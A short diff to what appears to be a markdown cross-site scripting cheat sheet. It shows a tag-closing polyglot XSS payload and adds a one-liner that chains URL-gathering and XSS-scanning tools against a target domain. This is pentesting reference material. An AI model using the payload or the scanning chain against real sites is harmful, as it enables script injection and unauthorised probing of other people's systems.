@@ -402,3 +402,9 @@ Note that `HTML tags` that need to be closed for `XSS`.
 ```c
 --></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
 ```
+
+### Single Domain One-liner
+
+```c
+$ echo https://<DOMAIN>/ | gau | gf xss | uro | Gxss | kxss | tee <FILE>.txt
+```
